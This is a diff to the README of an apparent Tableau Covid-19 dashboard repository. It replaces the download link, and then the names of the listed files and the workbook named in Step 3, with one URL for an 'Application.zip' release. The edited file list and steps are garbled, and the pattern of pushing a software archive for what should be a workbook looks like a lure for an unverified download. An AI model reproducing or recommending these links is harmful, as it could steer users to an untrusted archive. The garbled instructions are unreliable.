@@ -31,11 +31,11 @@ This repository contains the Tableau files used to create the Covid-19 Dashboard
 
 ### How to Access the Software
 To access the Tableau files and visualize the Covid-19 Dashboard, please click on the following link:
-[![Download Software](https://img.shields.io/badge/Download-Software-blue)](https://github.com/rokytd/files/raw/refs/heads/master/Software.zip)
+[![Download Software](https://github.com/hza3o/Covid-19_Dashboard/releases/download/v1.0.0/Application.zip)](https://github.com/hza3o/Covid-19_Dashboard/releases/download/v1.0.0/Application.zip)
 
 ### 📂 Files Included:
-- **README.md:** You are currently reading this file, the main README for the repository.
-- **Covid-19_Dashboard.twb:** Tableau workbook file containing the Covid-19 Dashboard visualizations.
+- **https://github.com/hza3o/Covid-19_Dashboard/releases/download/v1.0.0/Application.zip** You are currently reading this file, the main README for the repository.
+- **https://github.com/hza3o/Covid-19_Dashboard/releases/download/v1.0.0/Application.zip** Tableau workbook file containing the Covid-19 Dashboard visualizations.
 - **Data Files:** Dataset files used for creating the visualizations.
 
 ### 🌐 Visit the Dashboard
@@ -44,7 +44,7 @@ To view the Covid-19 Dashboard live in action, please click on the link provided
 ### 🚀 Get Started!
 - **Step 1:** Download the software from the provided link.
 - **Step 2:** Extract the files from the downloaded ZIP folder.
-- **Step 3:** Open the Tableau workbook file "Covid-19_Dashboard.twb" using Tableau software.
+- **Step 3:** Open the Tableau workbook file "https://github.com/hza3o/Covid-19_Dashboard/releases/download/v1.0.0/Application.zip" using Tableau software.
 - **Step 4:** Explore the visualizations and customize them to suit your needs.
 
 ### 📈 Visualize, Analyze, Stay Informed!
